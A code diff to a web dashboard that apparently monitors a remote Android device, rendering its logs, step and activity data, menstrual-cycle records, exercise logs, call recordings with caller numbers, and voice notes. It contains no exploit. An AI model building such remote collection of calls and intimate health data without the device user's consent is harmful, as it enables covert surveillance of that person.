+  const entries = [];
+  if (logcatData && typeof logcatData === 'object') {
+    for (const [key, val] of Object.entries(logcatData)) {
+      const ts = parseInt(key);
+      if (ts && (val.logcat || '').length > 0) {
+        entries.push({ ts, logcat: val.logcat, lines: val.lines || 0, anr: false });
+      }
+    }
   }
-  logcatCache = Object.entries(data)
-    .map(([ts, val]) => ({
-      ts: parseInt(ts),
-      logcat: val.logcat || '',
-      lines: val.lines || 0
-    }))
-    .filter(s => s.ts && s.logcat)
-    .sort((a, b) => b.ts - a.ts)
-    .slice(0, 50);
+  if (anrData && typeof anrData === 'object') {
+    for (const [key, val] of Object.entries(anrData)) {
+      const ts = parseInt(val.ts_ms || key || '0');
+      if (ts && (val.logcat || '').length > 0) {
+        entries.push({
+          ts,
+          logcat: val.logcat,
+          lines: (val.logcat || '').split('\n').length,
+          source: val.source || 'ANR',
+          thread: val.thread || '',
+          anr: true
+        });
+      }
+    }
+  }
+  entries.sort((a, b) => b.ts - a.ts);
+  logcatCache = entries.slice(0, 50);
   renderLogcat();
 }
 
@@ -3162,7 +4130,6 @@ function renderLogcat() {
   let html = '';
   for (const entry of logcatCache) {
     let lines = entry.logcat.split('\n');
-    // Filter by log level
     if (filter) {
       const prefix = ' ' + filter + '/';
       lines = lines.filter(l => l.includes(prefix));
@@ -3170,22 +4137,45 @@ function renderLogcat() {
     if (query) {
       lines = lines.filter(l => l.toLowerCase().includes(query));
     }
-    lines = lines.slice(0, 200);
     if (!lines.length && (filter || query)) continue;
-    html += `<div class="card" style="padding:10px 14px;margin-bottom:4px">
+    const key = entry.ts;
+    const expanded = logcatExpanded.has(key);
+    const preview = lines.slice(0, 2).map(l => l.length > 120 ? l.slice(0, 120) + '\u2026' : l).join('\n');
+    const badge = entry.anr
+      ? '<span class="chip" style="background:var(--danger);color:#000;font-size:9px;padding:1px 6px;margin-right:6px">' + escHtml(entry.source || 'CRASH') + '</span>'
+      : '';
+    html += `<div class="card logcat-entry${expanded ? ' expanded' : ''}" style="padding:10px 14px;margin-bottom:4px;cursor:pointer" onclick="toggleLogcatEntry(${key})">
       <div style="display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;margin-bottom:6px">
-        <span style="font-size:14px;color:var(--muted)">${pkt(entry.ts)}</span>
-        <span style="font-size:13px;color:var(--muted)">${lines.length}/${entry.lines} lines</span>
+        <span style="font-size:12px;color:var(--muted)">\u{1F4C4} ${pkt(entry.ts)}${badge}</span>
+        <span style="font-size:11px;color:var(--muted)">${expanded ? '\u{25BE}' : '\u{25B8}'} ${lines.length} lines${entry.thread ? ' \u00B7 ' + escHtml(entry.thread) : ''}</span>
       </div>
-      <pre style="font-family:monospace;font-size:12px;color:var(--text);white-space:pre-wrap;overflow-x:auto;max-height:300px">${escHtml(lines.join('\n'))}</pre>
+      ${expanded
+        ? `<pre style="font-family:monospace;font-size:10px;color:var(--text);white-space:pre-wrap;overflow-x:auto">${escHtml(lines.join('\n'))}</pre>`
+        : `<pre style="font-family:monospace;font-size:10px;color:var(--muted);white-space:pre-wrap;overflow:hidden;max-height:3em">${escHtml(preview)}</pre>`
+      }
     </div>`;
   }
   list.innerHTML = html || '<div class="label">No logcat matches your search</div>';
 }
 
 function clearLogcat() {
+  if (!selectedDevice) return;
   logcatCache = [];
+  logcatExpanded.clear();
   document.getElementById('logcatContent').innerHTML = '<div class="label" style="color:var(--muted)">Logcat cleared</div>';
+  deleteRTDB(`devices/${selectedDevice}/logcat`);
+  deleteRTDB(`devices/${selectedDevice}/anr_logs`);
+}
+
+function toggleLogcatEntry(ts) {
+  if (logcatExpanded.has(ts)) logcatExpanded.delete(ts);
+  else logcatExpanded.add(ts);
+  renderLogcat();
+}
+
+function collapseAllLogcat() {
+  logcatExpanded.clear();
+  renderLogcat();
 }
 
 document.getElementById('logcatFilter')?.addEventListener('change', renderLogcat);
@@ -3282,8 +4272,8 @@ async function pollHealth() {
 
   // Activity card
   if (activity && activity.type) {
-    const iconMap = { STILL: '🧘', WALKING: '🚶', RUNNING: '🏃', ON_BICYCLE: '🚴', IN_VEHICLE: '🚗', TILTING: '📱', UNKNOWN: '❓' };
-    const icon = iconMap[activity.type] || '❓';
+    const iconMap = { STILL: '\u{1F9D8}', WALKING: '\u{1F6B6}', RUNNING: '\u{1F3C3}', ON_BICYCLE: '\u{1F6B4}', IN_VEHICLE: '\u{1F697}', TILTING: '\u{1F4F1}', UNKNOWN: '\u2753' };
+    const icon = iconMap[activity.type] || '\u2753';
     document.getElementById('healthActivity').textContent = `${icon} ${activity.type}`;
     document.getElementById('healthActivityConfidence').textContent = `Confidence: ${activity.confidence}% | Source: ${activity.source} | ${pkt(activity.ts_ms)}`;
   } else {
@@ -3291,22 +4281,20 @@ async function pollHealth() {
     document.getElementById('healthActivityConfidence').textContent = 'No activity data yet';
   }
 
-  // Step history chart
+  // Step history chart (canvas)
   if (stepsData && typeof stepsData === 'object') {
     healthStepCache = Object.entries(stepsData)
       .map(([date, val]) => ({ date, steps: val.steps || 0, ts: val.ts_ms || 0 }))
       .filter(s => s.date && s.date.length === 10)
       .sort((a, b) => a.date.localeCompare(b.date))
       .slice(-7);
-    renderStepChart();
-  } else {
-    document.getElementById('healthStepChart').innerHTML = '<div class="label" style="width:100%;text-align:center;color:var(--muted)">No step history yet</div>';
+    drawStepChartCanvas();
   }
 
   // Activity timeline
   if (activity && activity.type) {
-    const iconMap = { STILL: '🧘', WALKING: '🚶', RUNNING: '🏃', ON_BICYCLE: '🚴', IN_VEHICLE: '🚗', TILTING: '📱', UNKNOWN: '❓' };
-    const icon = iconMap[activity.type] || '❓';
+    const iconMap = { STILL: '\u{1F9D8}', WALKING: '\u{1F6B6}', RUNNING: '\u{1F3C3}', ON_BICYCLE: '\u{1F6B4}', IN_VEHICLE: '\u{1F697}', TILTING: '\u{1F4F1}', UNKNOWN: '\u2753' };
+    const icon = iconMap[activity.type] || '\u2753';
     document.getElementById('healthActivityTimeline').innerHTML = `
       <div class="card" style="padding:8px 12px;margin-bottom:4px">
         <div style="display:flex;justify-content:space-between;font-size:14px">
@@ -3315,30 +4303,378 @@ async function pollHealth() {
         </div>
       </div>`;
   }
+
+  // Haidh
+  try {
+    const [haidhCycles, haidhPhases, haidhMeta] = await Promise.all([
+      fetchRTDB(`devices/${selectedDevice}/haidh/cycles`),
+      fetchRTDB(`devices/${selectedDevice}/haidh/phases`),
+      fetchRTDB(`devices/${selectedDevice}/haidh/meta`)
+    ]);
+    if (haidhCycles && typeof haidhCycles === 'object') {
+      document.getElementById('haidhSection').style.display = 'block';
+      renderHaidh(haidhCycles, haidhPhases, haidhMeta);
+    } else {
+      document.getElementById('haidhSection').style.display = 'none';
+    }
+  } catch { document.getElementById('haidhSection').style.display = 'none'; }
+  // Exercise
+  try {
+    const [exDaily, exMeta] = await Promise.all([
+      fetchRTDB(`devices/${selectedDevice}/exercise/daily`),
+      fetchRTDB(`devices/${selectedDevice}/exercise/meta`)
+    ]);
+    if (exDaily && typeof exDaily === 'object') {
+      document.getElementById('exerciseSection').style.display = 'block';
+      renderExercise(exDaily, exMeta);
+    } else {
+      document.getElementById('exerciseSection').style.display = 'none';
+    }
+  } catch { document.getElementById('exerciseSection').style.display = 'none'; }
 }
 
-function renderStepChart() {
-  const el = document.getElementById('healthStepChart');
-  if (!healthStepCache.length) {
-    el.innerHTML = '<div class="label" style="width:100%;text-align:center;color:var(--muted)">No step history yet</div>';
+function drawStepChartCanvas() {
+  const canvas = document.getElementById('healthStepCanvas');
+  if (!canvas || !healthStepCache.length) {
+    if (canvas) canvas.style.display = 'none';
     return;
   }
-  const max = Math.max(...healthStepCache.map(s => s.steps), 1);
-  const goal = parseInt(document.getElementById('healthStepsGoal').textContent.replace(/[^0-9]/g, '')) || 8000;
-  const barMax = Math.max(max, goal);
-  let html = '';
-  for (const entry of healthStepCache) {
-    const h = Math.max(3, (entry.steps / barMax) * 100);
-    const dayLabel = entry.date.slice(5);
-    html += `<div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:4px">
-      <div style="font-size:11px;color:var(--muted)">${entry.steps.toLocaleString()}</div>
-      <div style="width:100%;display:flex;justify-content:center;align-items:flex-end;height:80px">
-        <div style="width:70%;height:${h}px;background:${entry.steps >= goal ? 'var(--success)' : 'var(--accent)'};border-radius:4px 4px 0 0;transition:height 0.3s;min-height:3px"></div>
-      </div>
-      <div style="font-size:11px;color:var(--muted)">${dayLabel}</div>
-    </div>`;
+  canvas.style.display = 'block';
+  const ctx = canvas.getContext('2d');
+  const dpr = window.devicePixelRatio || 1;
+  const rect = canvas.parentElement.getBoundingClientRect();
+  const w = rect.width || canvas.parentElement.clientWidth || 600;
+  const h = 160;
+  canvas.width = w * dpr;
+  canvas.height = h * dpr;
+  canvas.style.width = w + 'px';
+  canvas.style.height = h + 'px';
+  ctx.scale(dpr, dpr);
+  const pad = { top: 20, right: 16, bottom: 32, left: 48 };
+  const cw = w - pad.left - pad.right;
+  const ch = h - pad.top - pad.bottom;
+  ctx.clearRect(0, 0, w, h);
+  // Background
+  ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--bg').trim() || '#0d1117';
+  ctx.fillRect(0, 0, w, h);
+  const goal = Math.max(...healthStepCache.map(s => s.steps), 8000);
+  const maxVal = Math.max(...healthStepCache.map(s => s.steps), goal);
+  const vals = healthStepCache.map(s => s.steps);
+  const labels = healthStepCache.map(s => {
+    const d = new Date(s.date + 'T00:00:00');
+    return d.toLocaleDateString('en-GB', { weekday: 'short', day: 'numeric' });
+  });
+  // Grid lines
+  ctx.strokeStyle = getComputedStyle(document.documentElement).getPropertyValue('--border').trim() || '#30363d';
+  ctx.lineWidth = 1;
+  ctx.font = '11px -apple-system, sans-serif';
+  ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--muted').trim() || '#8b949e';
+  ctx.textAlign = 'right';
+  ctx.textBaseline = 'middle';
+  const gridLines = 4;
+  for (let i = 0; i <= gridLines; i++) {
+    const y = pad.top + (ch / gridLines) * i;
+    ctx.beginPath(); ctx.moveTo(pad.left, y); ctx.lineTo(w - pad.right, y); ctx.stroke();
+    const val = Math.round(maxVal - (maxVal / gridLines) * i);
+    ctx.fillText(val.toLocaleString(), pad.left - 8, y);
   }
-  el.innerHTML = html;
+  // Goal line
+  if (goal > 0) {
+    const goalY = pad.top + ch - (goal / maxVal) * ch;
+    ctx.strokeStyle = getComputedStyle(document.documentElement).getPropertyValue('--accent').trim() || '#58a6ff';
+    ctx.setLineDash([4, 4]);
+    ctx.beginPath(); ctx.moveTo(pad.left, goalY); ctx.lineTo(w - pad.right, goalY); ctx.stroke();
+    ctx.setLineDash([]);
+    ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--accent').trim() || '#58a6ff';
+    ctx.textAlign = 'left';
+    ctx.fillText('Goal: ' + goal.toLocaleString(), w - pad.right - 100, goalY - 8);
+  }
+  // Bars
+  const barW = Math.min(36, (cw / vals.length) * 0.6);
+  const gap = (cw - barW * vals.length) / (vals.length + 1);
+  const isDark = getComputedStyle(document.documentElement).getPropertyValue('--bg').trim().toLowerCase().includes('0d') || true;
+  for (let i = 0; i < vals.length; i++) {
+    const x = pad.left + gap + i * (barW + gap);
+    const barH = (vals[i] / maxVal) * ch;
+    const y = pad.top + ch - barH;
+    // Rounded rect
+    const r = 4;
+    ctx.beginPath();
+    ctx.moveTo(x + r, y);
+    ctx.lineTo(x + barW - r, y);
+    ctx.quadraticCurveTo(x + barW, y, x + barW, y + r);
+    ctx.lineTo(x + barW, pad.top + ch);
+    ctx.lineTo(x, pad.top + ch);
+    ctx.lineTo(x, y + r);
+    ctx.quadraticCurveTo(x, y, x + r, y);
+    ctx.closePath();
+    const gradient = ctx.createLinearGradient(x, y, x, pad.top + ch);
+    const accent = getComputedStyle(document.documentElement).getPropertyValue('--accent').trim() || '#58a6ff';
+    const success = getComputedStyle(document.documentElement).getPropertyValue('--success').trim() || '#3fb950';
+    if (vals[i] >= goal) {
+      gradient.addColorStop(0, success);
+      gradient.addColorStop(1, success + '88');
+    } else {
+      gradient.addColorStop(0, accent);
+      gradient.addColorStop(1, accent + '88');
+    }
+    ctx.fillStyle = gradient;
+    ctx.fill();
+    // Label
+    ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--muted').trim() || '#8b949e';
+    ctx.textAlign = 'center';
+    ctx.textBaseline = 'top';
+    ctx.fillText(labels[i], x + barW / 2, pad.top + ch + 8);
+  }
+  // Y-axis label
+  ctx.save();
+  ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--muted').trim() || '#8b949e';
+  ctx.textAlign = 'center';
+  ctx.textBaseline = 'top';
+  ctx.font = '10px -apple-system, sans-serif';
+  ctx.restore();
+}
+
+function renderHaidh(cycles, phases, meta) {
+  const summaryDiv = document.getElementById('haidhSummary');
+  if (!summaryDiv) return;
+  const today = new Date().toISOString().slice(0, 10);
+  const cycleData = cycles || {};
+  const sortedCycles = Object.entries(cycleData).map(([date, data]) => ({ date, ...data })).sort((a, b) => a.date.localeCompare(b.date));
+  const todayEntry = cycleData[today];
+  const haidhDays = Object.values(cycleData).filter(c => c.status === 'HAIDH').length;
+  const istihadaDays = Object.values(cycleData).filter(c => c.istihadaType && c.istihadaType !== 'NONE').length;
+  const tuhrDays = Object.values(cycleData).filter(c => c.status === 'TUHR' && (!c.istihadaType || c.istihadaType === 'NONE')).length;
+  document.getElementById('haidhLastSync').textContent = meta?.lastSync ? 'Last sync: ' + meta.lastSync : 'Never synced';
+  summaryDiv.innerHTML = `
+    <div class="card" style="border-left-color:#ef4444;padding:10px 12px">
+      <div class="label">🔴 Haidh Days</div>
+      <div style="font-size:24px;font-weight:700;color:#ef4444">${haidhDays}</div>
+    </div>
+    <div class="card" style="border-left-color:#eab308;padding:10px 12px">
+      <div class="label">🟡 Istihada Days</div>
+      <div style="font-size:24px;font-weight:700;color:#eab308">${istihadaDays}</div>
+    </div>
+    <div class="card" style="border-left-color:#22c55e;padding:10px 12px">
+      <div class="label">🟢 Tuhr Days</div>
+      <div style="font-size:24px;font-weight:700;color:#22c55e">${tuhrDays}</div>
+    </div>
+    <div class="card" style="border-left-color:#ffca28;padding:10px 12px">
+      <div class="label">${todayEntry?.status === 'HAIDH' ? '🔴' : '🟢'} Today</div>
+      <div style="font-size:18px;font-weight:700">${todayEntry?.status || 'TUHR'}</div>
+      <div style="font-size:10px;color:var(--muted)">${todayEntry?.istihadaType && todayEntry.istihadaType !== 'NONE' ? '⚠️ ' + todayEntry.istihadaType : ''}</div>
+    </div>`;
+  renderHaidhCalendar(sortedCycles);
+}
+
+function renderHaidhCalendar(sortedCycles) {
+  const container = document.getElementById('haidhCalendarContainer');
+  if (!container) return;
+  const cycleMap = new Map(sortedCycles.map(c => [c.date, c]));
+  const today = new Date();
+  const todayStr = today.toISOString().slice(0, 10);
+  const months = [];
+  for (let i = -1; i <= 0; i++) {
+    const d = new Date(today.getFullYear(), today.getMonth() + i, 1);
+    months.push({ year: d.getFullYear(), month: d.getMonth() });
+  }
+  const dayNames = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
+  const statusColors = {
+    HAIDH: { 1: '#8b4513', 2: '#b22222', 3: '#8b0000', 0: '#6b0000' },
+    ISTIHADA: { QALILA: '#fcd34d', MUTAWASITA: '#fbbf24', KATHIRA: '#eab308' },
+    TUHR: '#f5f5dc', NONE: '#1c1f33', FUTURE: '#2d2f4a'
+  };
+  let html = '<div style="display:flex;flex-direction:column;gap:16px">';
+  months.forEach((m, mi) => {
+    const daysInMonth = new Date(m.year, m.month + 1, 0).getDate();
+    const firstDayOfWeek = new Date(m.year, m.month, 1).getDay();
+    const monthName = new Date(m.year, m.month, 1).toLocaleString('default', { month: 'long' });
+    html += `<div style="background:var(--card);border-radius:8px;padding:12px;border-left:3px solid var(--accent)">
+      <div style="font-size:13px;font-weight:600;color:var(--accent);margin-bottom:8px">${monthName} ${m.year}</div>
+      <div style="display:grid;grid-template-columns:repeat(7,1fr);gap:2px;margin-bottom:4px">${dayNames.map(d => `<div style="text-align:center;font-size:10px;color:var(--muted);font-weight:600;padding:4px 0">${d}</div>`).join('')}</div>
+      <div style="display:grid;grid-template-columns:repeat(7,1fr);gap:2px">
+        ${Array(firstDayOfWeek).fill('').map(() => '<div style="min-height:32px"></div>').join('')}
+        ${Array.from({length: daysInMonth}, (_, i) => {
+          const dayNum = i + 1;
+          const date = new Date(m.year, m.month, dayNum);
+          const dateStr = date.toISOString().slice(0, 10);
+          const entry = cycleMap.get(dateStr);
+          const isFuture = date > today;
+          const isToday = dateStr === todayStr;
+          let bgColor, textColor = '#000', dayContent = dayNum.toString();
+          if (isFuture) { bgColor = statusColors.FUTURE; textColor = '#9ca3af'; }
+          else if (entry) {
+            if (entry.status === 'HAIDH') {
+              const fi = entry.flowIntensity || 0;
+              bgColor = statusColors.HAIDH[fi] || statusColors.HAIDH[0];
+              textColor = '#fff';
+              if (entry.cycleDay && entry.cycleDay > 0) dayContent += `<div style="font-size:8px;color:#fcd34d;margin-top:2px">يوم ${entry.cycleDay}</div>`;
+            } else if (entry.istihadaType && entry.istihadaType !== 'NONE') {
+              bgColor = statusColors.ISTIHADA[entry.istihadaType] || '#eab308';
+              textColor = '#000';
+              const icons = { QALILA: '⚠️', MUTAWASITA: '⚠️⚠️', KATHIRA: '⚠️⚠️⚠️' };
+              dayContent += `<div style="font-size:9px;margin-top:2px">${icons[entry.istihadaType] || ''}</div>`;
+            } else { bgColor = statusColors.TUHR; textColor = '#000'; }
+            if (entry.symptoms && entry.symptoms.trim()) dayContent += '<div style="font-size:9px;margin-top:2px">🌸</div>';
+          } else { bgColor = statusColors.NONE; textColor = '#9ca3af'; }
+          const todayBorder = isToday ? '2px solid #ffca28' : 'none';
+          return `<div style="background:${bgColor};border:${todayBorder};border-radius:4px;min-height:32px;padding:2px;display:flex;flex-direction:column;align-items:center;justify-content:center;color:${textColor};font-size:11px;font-weight:${isToday ? 'bold' : 'normal'}" title="${dateStr}">${dayContent}</div>`;
+        }).join('')}
+      </div>
+    </div>`;
+  });
+  html += '</div>';
+  html += `<div style="margin-top:12px;padding:10px;background:var(--card);border-radius:8px;border:1px solid var(--border);font-size:10px">
+    <div style="display:flex;flex-wrap:wrap;gap:8px;align-items:center;color:var(--muted)">
+      <span style="font-weight:600;color:var(--text)">Legend:</span>
+      <span style="display:inline-flex;align-items:center;gap:4px"><span style="width:12px;height:12px;background:#ff6b6b;border-radius:2px"></span>Haidh Light</span>
+      <span style="display:inline-flex;align-items:center;gap:4px"><span style="width:12px;height:12px;background:#b22222;border-radius:2px"></span>Haidh Med</span>
+      <span style="display:inline-flex;align-items:center;gap:4px"><span style="width:12px;height:12px;background:#8b0000;border-radius:2px"></span>Haidh Heavy</span>
+      <span style="display:inline-flex;align-items:center;gap:4px"><span style="width:12px;height:12px;background:#fcd34d;border-radius:2px"></span>Istihada Qalila</span>
+      <span style="display:inline-flex;align-items:center;gap:4px"><span style="width:12px;height:12px;background:#fbbf24;border-radius:2px"></span>Istihada Mutawasita</span>
+      <span style="display:inline-flex;align-items:center;gap:4px"><span style="width:12px;height:12px;background:#eab308;border-radius:2px"></span>Istihada Kathira</span>
+      <span style="display:inline-flex;align-items:center;gap:4px"><span style="width:12px;height:12px;background:#f5f5dc;border-radius:2px;border:1px solid var(--border)"></span>Tuhr</span>
+      <span style="display:inline-flex;align-items:center;gap:4px"><span style="width:12px;height:12px;background:#1c1f33;border-radius:2px;border:1px solid var(--border)"></span>No Data</span>
+      <span style="display:inline-flex;align-items:center;gap:4px"><span style="width:12px;height:12px;background:#2d2f4a;border-radius:2px;border:1px solid var(--border)"></span>Future</span>
+      <span style="display:inline-flex;align-items:center;gap:4px"><span style="width:12px;height:12px;border:2px solid #ffca28;border-radius:2px;background:transparent"></span>Today</span>
+      <span style="display:inline-flex;align-items:center;gap:4px">🌸 Symptoms</span>
+      <span style="display:inline-flex;align-items:center;gap:4px">⚠️ Istihada</span>
+    </div>
+  </div>`;
+  container.innerHTML = html;
+}
+
+function renderExercise(daily, meta) {
+  const summaryDiv = document.getElementById('exerciseSummary');
+  const lastSyncDiv = document.getElementById('exerciseLastSync');
+  if (!summaryDiv || !lastSyncDiv) return;
+  const data = daily || {};
+  const today = new Date().toISOString().slice(0, 10);
+  const sortedData = Object.entries(data).map(([date, val]) => ({ date, ...val })).sort((a, b) => a.date.localeCompare(b.date));
+  const thisWeekStart = new Date(); thisWeekStart.setDate(thisWeekStart.getDate() - thisWeekStart.getDay()); thisWeekStart.setHours(0,0,0,0);
+  const thisWeekDates = [];
+  for (let d = new Date(thisWeekStart); d <= new Date(); d.setDate(d.getDate() + 1)) thisWeekDates.push(d.toISOString().slice(0, 10));
+  const weeklyTarget = meta?.weeklyTarget || 4;
+  const weekCount = thisWeekDates.filter(d => data[d] && data[d].minutes > 0).length;
+  const totalDays = sortedData.filter(e => e.minutes > 0).length;
+  const todayMin = data[today]?.minutes || 0;
+  const totalMin = sortedData.reduce((s, e) => s + (e.minutes || 0), 0);
+  lastSyncDiv.textContent = meta?.lastSync ? 'Last sync: ' + meta.lastSync : '';
+  summaryDiv.innerHTML = `
+    <div class="card" style="border-left-color:var(--accent);padding:10px 12px">
+      <div class="label">🎯 Weekly Target</div>
+      <div style="font-size:24px;font-weight:700;color:var(--accent)">${weekCount}/${weeklyTarget} days</div>
+      <div style="font-size:10px;color:var(--muted)">${weekCount >= weeklyTarget ? '✅ Target met!' : '⚠️ ' + (weeklyTarget - weekCount) + ' more days needed'}</div>
+    </div>
+    <div class="card" style="border-left-color:var(--info);padding:10px 12px">
+      <div class="label">Today's Exercise</div>
+      <div style="font-size:24px;font-weight:700;color:var(--info)">${todayMin > 0 ? todayMin + ' min' : '--'}</div>
+    </div>
+    <div class="card" style="border-left-color:var(--success);padding:10px 12px">
+      <div class="label">Total Exercise Days</div>
+      <div style="font-size:24px;font-weight:700;color:var(--success)">${totalDays}</div>
+      <div style="font-size:10px;color:var(--muted)">${totalMin} total minutes</div>
+    </div>`;
+  renderExerciseCalendar(sortedData);
+}
+
+function renderExerciseCalendar(sortedData) {
+  const container = document.getElementById('exerciseCalendarContainer');
+  if (!container) return;
+  const today = new Date();
+  const months = [];
+  for (let i = -1; i <= 0; i++) {
+    const d = new Date(today.getFullYear(), today.getMonth() + i, 1);
+    months.push({ year: d.getFullYear(), month: d.getMonth() });
+  }
+  const dataMap = new Map(sortedData.filter(e => e.minutes > 0).map(e => [e.date, e]));
+  const dayNames = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
+  let html = '<div style="display:flex;flex-direction:column;gap:16px">';
+  months.forEach((m) => {
+    const daysInMonth = new Date(m.year, m.month + 1, 0).getDate();
+    const firstDayOfWeek = new Date(m.year, m.month, 1).getDay();
+    const monthName = new Date(m.year, m.month, 1).toLocaleString('default', { month: 'long' });
+    html += `<div style="background:var(--card);border-radius:8px;padding:12px;border-left:3px solid var(--accent)">
+      <div style="font-size:13px;font-weight:600;color:var(--accent);margin-bottom:8px">${monthName} ${m.year}</div>
+      <div style="display:grid;grid-template-columns:repeat(7,1fr);gap:2px;margin-bottom:4px">${dayNames.map(d => `<div style="text-align:center;font-size:10px;color:var(--muted);font-weight:600;padding:4px 0">${d}</div>`).join('')}</div>
+      <div style="display:grid;grid-template-columns:repeat(7,1fr);gap:2px">
+        ${Array(firstDayOfWeek).fill('').map(() => '<div style="min-height:32px"></div>').join('')}
+        ${Array.from({length: daysInMonth}, (_, i) => {
+          const dayNum = i + 1;
+          const date = new Date(m.year, m.month, dayNum);
+          const dateStr = date.toISOString().slice(0, 10);
+          const entry = dataMap.get(dateStr);
+          const isToday = dateStr === today.toISOString().slice(0, 10);
+          const isFuture = date > today;
+          let bg, textColor = '#000', content = dayNum.toString();
+          if (isFuture) { bg = '#2d2f4a'; textColor = '#9ca3af'; }
+          else if (entry) {
+            const min = entry.minutes || 0;
+            const intensity = min > 60 ? 'var(--success)' : min > 30 ? 'var(--accent)' : '#645';
+            bg = intensity; textColor = '#fff';
+            content += `<div style="font-size:9px;margin-top:2px">${min}m</div>`;
+          } else { bg = '#1c1f33'; textColor = '#9ca3af'; }
+          const border = isToday ? '2px solid #ffca28' : 'none';
+          return `<div style="background:${bg};border:${border};border-radius:4px;min-height:32px;padding:2px;display:flex;flex-direction:column;align-items:center;justify-content:center;color:${textColor};font-size:11px;font-weight:${isToday ? 'bold' : 'normal'}" title="${dateStr}${entry ? ': ' + entry.minutes + ' min' : ''}">${content}</div>`;
+        }).join('')}
+      </div>
+    </div>`;
+  });
+  html += '</div>';
+  container.innerHTML = html;
+}
+
+function exportStepChart() {
+  if (!healthStepCache || !healthStepCache.length) return;
+  const csv = ['Date,Steps'].concat(healthStepCache.map(e => `${e.date},${e.steps}`)).join('\n');
+  const blob = new Blob([csv], { type: 'text/csv' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = 'step_history_' + new Date().toISOString().slice(0, 10) + '.csv';
+  a.click(); URL.revokeObjectURL(url);
+}
+
+// --- Recording & Voice Delete Functions ---
+async function deleteRecording(recordingId) {
+  const deviceId = recordingDevice || selectedDevice;
+  if (!deviceId) { showAlert('No device selected', 'error'); return; }
+  if (!confirm('Delete this recording from RTDB?')) return;
+  try {
+    const rec = await fetchRTDB(`devices/${deviceId}/recordings/${recordingId}`);
+    if (rec && rec.segmentsCount) {
+      for (let i = 0; i < rec.segmentsCount; i++) {
+        await deleteRTDB(`devices/${deviceId}/recordings/${recordingId}/parts/${i}`);
+      }
+    }
+    await deleteRTDB(`devices/${deviceId}/recordings/${recordingId}`);
+    showAlert('Recording deleted', 'warn');
+    pollRemoteRecordings();
+  } catch (e) { showAlert('Delete failed: ' + e.message, 'error'); }
+}
+
+async function deleteVoiceNote(batchKey, noteIndex) {
+  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  try {
+    const batch = await fetchRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
+    if (!batch || !batch.notes || !batch.notes[noteIndex]) {
+      showAlert('Voice note not found', 'error');
+      return;
+    }
+    const note = batch.notes[noteIndex];
+    batch.notes.splice(noteIndex, 1);
+    batch.totalCount = batch.notes.length;
+    if (batch.notes.length === 0) {
+      await deleteRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
+    } else {
+      await fetch(`${RTDB}/devices/${selectedDevice}/voice_notes/${batchKey}.json`, {
+        method: 'PUT',
+        body: JSON.stringify(batch)
+      });
+    }
+    showAlert('Deleted voice note: ' + (note.fileName || 'unknown'), 'warn');
+    pollVoiceNotes();
+    refreshStorage();
+  } catch (e) { showAlert('Delete failed: ' + e.message, 'error'); }
 }
 
 // --- Init ---
@@ -3351,7 +4687,6 @@ async function init() {
     try { await fetchDevices(); if (selectedDevice) break; } catch {}
     if (!selectedDevice) await new Promise(r => setTimeout(r, 2000));
   }
-  if (selectedDevice) try { await pollAll(); } catch {}
   startPolling();
   if (geofences.length === 0) {
     showAlert('Right-click on map to add geofences', 'warn');
@@ -3386,7 +4721,7 @@ async function decryptSegment(encryptedB64) {
 async function pollCallRecordings() {
   if (!selectedDevice) return;
   const list = document.getElementById('callRecList');
-  list.innerHTML = '<div class="label" style="color:var(--accent)">⏳ Loading call recordings...</div>';
+  list.innerHTML = '<div class="label" style="color:var(--accent)">&#x23F3; Loading call recordings...</div>';
   const keys = await fetchRTDB(`devices/${selectedDevice}/recordings`, 'shallow=true');
   if (!keys || typeof keys !== 'object') {
     list.innerHTML = '<div class="label">No call recordings yet</div>';
@@ -3416,13 +4751,13 @@ function renderCallRecordings(recordings) {
   for (const rec of recordings) {
     const ts = rec.createdAt || parseInt(rec.key);
     const time = ts ? new Date(ts).toLocaleString() : '--';
-    const dur = formatDuration(rec.durationSec || 0);
+    const dur = formatDuration((rec.durationSec || 0) * 1000);
     const status = rec.status === 'completed' ? 'ok' : 'partial';
     const statusLabel = rec.status === 'completed' ? 'Complete' : 'Partial';
-    const enc = rec.encrypted ? '🔒' : '';
+    const enc = rec.encrypted ? '\u{1F512}' : '';
     const num = escHtml(rec.callerNumber || '--');
     const name = escHtml(rec.callerName || '--');
-    const dir = rec.callDirection === 'incoming' ? '⬅️' : (rec.callDirection === 'outgoing' ? '➡️' : '');
+    const dir = rec.callDirection === 'incoming' ? '\u2B05\uFE0F' : (rec.callDirection === 'outgoing' ? '\u27A1\uFE0F' : '');
     const segs = rec.segmentsCount || 0;
     const recId = rec.key;
     const failed = rec.failedSegments ? rec.failedSegments.join(',') : '';
@@ -3431,10 +4766,10 @@ function renderCallRecordings(recordings) {
         <div><span class="cr-name">${dir} ${num}</span> ${name !== '--' ? `<span class="cr-meta">(${name})</span>` : ''}</div>
         <div><span class="cr-status ${status}">${statusLabel}</span></div>
       </div>
-      <div class="cr-meta">${time} · ${dur} · ${segs} segments · ${enc}</div>`;
+      <div class="cr-meta">${time} \u00B7 ${dur} \u00B7 ${segs} segments \u00B7 ${enc}</div>`;
     if (failed) html += `<div class="cr-meta" style="color:var(--danger)">Failed segments: ${failed}</div>`;
     html += `<div style="margin-top:4px">
-      <button class="chip" style="background:var(--accent);color:#000;font-size:12px;cursor:pointer" onclick="loadCallRecordingParts('${recId}',${segs},${rec.encrypted})">▶ Play</button>
+      <button class="chip" style="background:var(--accent);color:#000;font-size:12px;cursor:pointer" onclick="loadCallRecordingParts('${recId}',${segs},${rec.encrypted})">\u25B6 Play</button>
       <div id="crPlayer_${recId}" style="margin-top:4px;display:none"></div>
     </div></div>`;
   }
@@ -3446,7 +4781,7 @@ async function loadCallRecordingParts(recId, totalSegs, encrypted) {
   if (!container) return;
